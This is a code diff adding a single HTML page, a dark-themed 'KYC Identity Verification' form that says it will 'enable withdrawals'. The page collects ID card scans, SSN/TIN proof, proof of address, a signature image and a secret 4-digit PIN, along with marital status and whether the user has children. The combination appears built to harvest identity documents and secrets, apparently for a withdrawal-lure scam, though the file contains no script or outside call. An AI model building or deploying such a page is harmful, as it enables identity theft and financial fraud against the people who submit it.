@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>KYC Verification</title>
+
+<style>
+body{
+    font-family: Arial, Helvetica, sans-serif;
+    background: linear-gradient(135deg,#020617,#0a0f2c);
+    color:white;
+    margin:0;
+}
+
+.container{
+    max-width:900px;
+    margin:40px auto;
+    background:#0f172a;
+    padding:30px;
+    border-radius:15px;
+    box-shadow:0 0 40px rgba(0,0,0,0.7);
+}
+
+h1{
+    text-align:center;
+    color:#00ffd5;
+}
+
+.sub{
+    text-align:center;
+    color:#ccc;
+    margin-bottom:25px;
+}
+
+.section{
+    background:#020617;
+    padding:20px;
+    border-radius:12px;
+    margin-top:20px;
+}
+
+label{
+    font-weight:bold;
+    display:block;
+    margin-top:15px;
+}
+
+input, select, textarea{
+    width:100%;
+    padding:12px;
+    margin-top:6px;
+    border:none;
+    border-radius:8px;
+    background:#020617;
+    color:white;
+}
+
+input[type=file]{
+    background:#020617;
+}
+
+button{
+    width:100%;
+    padding:15px;
+    margin-top:25px;
+    background:#00ffd5;
+    color:black;
+    border:none;
+    border-radius:10px;
+    font-size:18px;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#00c9a7;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+<h1>🔐 KYC Identity Verification</h1>
+<div class="sub">Complete verification to secure your account & enable withdrawals</div>
+
+<form action="/kyc" method="POST" enctype="multipart/form-data">
+
+<div class="section">
+<h3>👤 Personal Information</h3>
+
+<label>Full Name</label>
+<input type="text" name="fullname" required>
+
+<label>Email Address</label>
+<input type="email" name="email" required>
+
+<label>Home Address</label>
+<textarea name="address" required></textarea>
+
+<label>Marital Status</label>
+<select name="marital_status" required>
+<option value="">Select</option>
+<option>Single</option>
+<option>Married</option>
+<option>Divorced</option>
+</select>
+
+<label>Do you have kids?</label>
+<select name="kids" required>
+<option value="">Select</option>
+<option>Yes</option>
+<option>No</option>
+</select>
+
+</div>
+
+<div class="section">
+<h3>🆔 Identity Upload</h3>
+
+<label>ID Card Front</label>
+<input type="file" name="id_front" required>
+
+<label>ID Card Back</label>
+<input type="file" name="id_back" required>
+
+<label>SSN / TIN Proof Upload</label>
+<input type="file" name="ssn_proof" required>
+
+<label>Proof of Address</label>
+<input type="file" name="proof_address" required>
+
+</div>
+
+<div class="section">
+<h3>🔑 Security Verification</h3>
+
+<label>Secret PIN (4 digits)</label>
+<input type="password" name="pin" maxlength="4" required>
+
+<label>Signature Proof</label>
+<input type="file" name="signature" required>
+
+</div>
+
+<div class="section">
+<h3>📩 Final Verification</h3>
+
+<select name="verification_type" required>
+<option value="">Select</option>
+<option value="email">Send verification link to my email</option>
+</select>
+
+<p style="color:#aaa;font-size:14px;margin-top:10px;">
+After submitting KYC, a final verification link will be sent to your email.
+Click the link to complete account verification.
+</p>
+</div>
+
+<button type="submit">Submit KYC Verification</button>
+
+</form>
+</div>
+
+</body>
+</html>
